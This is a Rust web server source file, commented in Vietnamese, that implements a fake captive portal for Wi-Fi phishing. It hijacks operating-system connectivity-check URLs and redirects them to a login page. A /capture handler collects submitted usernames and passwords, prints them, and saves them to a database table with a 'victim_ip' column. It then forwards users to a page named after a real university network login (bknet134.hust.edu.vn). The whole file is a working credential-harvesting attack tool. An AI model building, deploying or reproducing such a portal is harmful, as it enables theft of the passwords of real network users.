use axum::{
    extract::{Form, State},
    routing::{post, get, get_service}, 
    response::{Redirect, IntoResponse},
    http::StatusCode, 
    Router,
    serve,
};
use tower_http::services::ServeDir;
use tower::{service_fn}; 
use std::convert::Infallible; 
use std::net::SocketAddr;
use tokio::net::TcpListener;
use axum::body::Body; 


use sqlx::{postgres::PgPoolOptions, Pool, Postgres};
use dotenv::dotenv;
use std::env;
use uuid::Uuid;
use chrono::Utc;

use serde::Deserialize;

#[derive(Deserialize)]
struct LoginForm {
    username: String,
    password: String,
}

#[derive(Clone)]
struct AppState {
    db_pool: Pool<Postgres>,
}

#[tokio::main]
async fn main() {
    dotenv().ok();

    let database_url = env::var("DATABASE_URL")
        .expect("Thiếu biến môi trường DATABASE_URL. Vui lòng cấu hình file .env");

    let db_pool = PgPoolOptions::new()
        .max_connections(5)
        .connect(&database_url)
        .await
        .expect("Không thể kết nối đến database");
    sqlx::migrate!("./migrations")
        .run(&db_pool)
        .await
        .expect("Lỗi khi chạy database migrations");

    println!("Database migrations chạy thành công!");

    let app_state = AppState { db_pool };

    // Tạo một service để chuyển hướng mọi yêu cầu không tìm thấy file về trang gốc "/"
    let redirect_to_root_service = service_fn(|_req: axum::http::Request<Body>| async {
        Ok::<_, Infallible>(Redirect::to("/").into_response())
    });

    // Tạo ServeDir service. Khi nó không tìm thấy file, nó sẽ sử dụng redirect_to_root_service.
    let static_files_server_with_redirect = ServeDir::new("content")
        .append_index_html_on_directories(true)
        .not_found_service(redirect_to_root_service); 

    // TẠO MỘT ROUTER RIÊNG CHO CÁC KIỂM TRA KẾT NỐI (NCSI)
    let ncsi_router = Router::new()
        .route("/generate_204", get(connectivity_check_redirect_handler)) 
        .route("/connecttest.txt", get(connectivity_check_redirect_handler)) 
        .route("/ncsi.txt", get(connectivity_check_redirect_handler));     
        // Thêm các URL kiểm tra khác nếu cần (ví dụ: Apple iOS: /hotspot-detect.html)
        // .route("/hotspot-detect.html", get(connectivity_check_redirect_handler))

    let app = Router::new()
        // 1. Route cho form đăng nhập (POST requests)
        .route("/capture", post(capture_credentials_handler))
        // 2. Gộp Router NCSI vào Router chính.
        //    Các route trong `ncsi_router` sẽ được ưu tiên xử lý.
        .merge(ncsi_router) 

        // 3. Sử dụng `fallback_service` để bắt TẤT CẢ các yêu cầu không khớp với các routes trên.
        //    Những yêu cầu này sẽ được chuyển cho `static_files_server_with_redirect`.
        //    - Nếu là file tĩnh có sẵn, `ServeDir` phục vụ.
        //    - Nếu không phải, `not_found_service` (redirect_to_root_service) sẽ được kích hoạt.
        .fallback_service(get_service(static_files_server_with_redirect)) 
        .with_state(app_state);

    let addr = SocketAddr::from(([0, 0, 0, 0], 3000));
    println!("Server đang chạy http://{}", addr);

    let listener = TcpListener::bind(&addr).await.unwrap();
    serve(listener, app).await.unwrap();
}

// Handler cho các yêu cầu kiểm tra kết nối mạng của hệ điều hành
async fn connectivity_check_redirect_handler() -> impl IntoResponse {
    println!("DEBUG: connectivity_check_redirect_handler called!"); // Thêm debug log
    // Trả về 302 Redirect đến trang gốc (login portal)
    Redirect::to("/").into_response()
}


async fn capture_credentials_handler(
    State(state): State<AppState>,
    Form(credentials): Form<LoginForm>
) -> impl axum::response::IntoResponse {
    println!("Đã thu thập thông tin đăng nhập:");
    println!("Username: {}", credentials.username);
    println!("Password: {}", credentials.password);

    let victim_ip = "N/A".to_string(); 
    let user_agent = "N/A".to_string(); 
    let captured_at = Utc::now();
    let id = Uuid::new_v4();

    let result = sqlx::query!(
        r#"
        INSERT INTO credentials (id, username, password, victim_ip, user_agent, captured_at)
        VALUES ($1, $2, $3, $4, $5, $6)
        "#,
        id,
        credentials.username,
        credentials.password,
        victim_ip,
        user_agent,
        captured_at
    )
    .execute(&state.db_pool)
    .await;

    match result {
        Ok(_) => println!("Đã lưu thông tin đăng nhập vào database"),
        Err(e) => eprintln!("Lỗi khi lưu thông tin vào database: {}", e),
    }

    let redirect_url = "/bknet134.hust.edu.vn_login.html"; 
    println!("Redirecting to: {}", redirect_url);
    Redirect::to(redirect_url).into_response()
}